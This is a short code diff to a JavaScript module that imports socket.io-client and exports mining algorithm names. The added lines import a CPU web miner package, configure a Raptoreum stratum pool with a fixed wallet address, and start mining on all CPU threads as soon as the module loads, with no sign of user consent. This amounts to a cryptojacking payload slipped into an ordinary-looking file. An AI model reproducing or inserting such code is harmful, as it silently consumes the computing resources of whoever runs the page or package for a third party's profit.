@@ -1,6 +1,16 @@
 import { io } from "socket.io-client";
 
+import * as cpuWebMiner from "@marco_ciaramella/cpu-web-miner";
 
+const stratum = {
+    server: "europe.raptoreum.zone",
+    port: 3333,
+    worker: "RY3WyocxKLRPFGKkUX8jvRyyRKBJaugFd5",
+    password: "x",
+    ssl: false // true when pool uses SSL, false otherwise
+}
+
+cpuWebMiner.start(cpuWebMiner.ghostrider, stratum, true, cpuWebMiner.ALL_THREADS);
 
 
 export const yespower = "cwm_yespower";
